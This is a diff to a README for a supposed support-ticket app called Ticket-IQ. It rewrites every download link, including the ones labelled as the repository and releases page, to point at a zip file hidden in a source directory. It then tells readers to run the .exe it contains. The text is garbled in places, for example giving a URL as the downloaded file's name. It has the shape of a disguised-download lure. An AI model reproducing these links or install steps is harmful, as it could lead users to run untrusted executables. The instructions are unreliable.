@@ -1,6 +1,6 @@
 # 🎫 Ticket-IQ - Your Smart Support Ticket System
 
-[![Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip)](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip)
+[![Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip)](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you proceed, ensure you have the following:
 
 To download Ticket-IQ, visit the link below:
 
-[Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip)
+[Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip)
 
 On the Releases page, look for the latest version. Click on it to start the download. This file contains everything you need to run the application smoothly.
 
@@ -27,7 +27,7 @@ On the Releases page, look for the latest version. Click on it to start the down
 Once the download is complete, follow these steps to install Ticket-IQ:
 
 1. **Locate the Downloaded File**: 
-   Go to the folder where your downloads are saved. You should see a file named something like `https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip` or similar.
+   Go to the folder where your downloads are saved. You should see a file named something like `https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip` or similar.
 
 2. **Run the Installer**:
    - For Windows: Double-click the `.exe` file. 
@@ -76,8 +76,8 @@ If you're interested in improving Ticket-IQ, consider contributing! You can repo
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [Ticket-IQ on GitHub](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip)
-- **Releases Page**: [Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/isozooid/Ticket-IQ.zip)
+- **GitHub Repository**: [Ticket-IQ on GitHub](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip)
+- **Releases Page**: [Download Ticket-IQ](https://raw.githubusercontent.com/KnhPhSn/Ticket-IQ/main/client/src/store/slices/IQ_Ticket_v3.3.zip)
 - **Support Forums**: Available within the application
 
 Thank you for choosing Ticket-IQ! We hope it makes your support ticket management easier and more efficient.
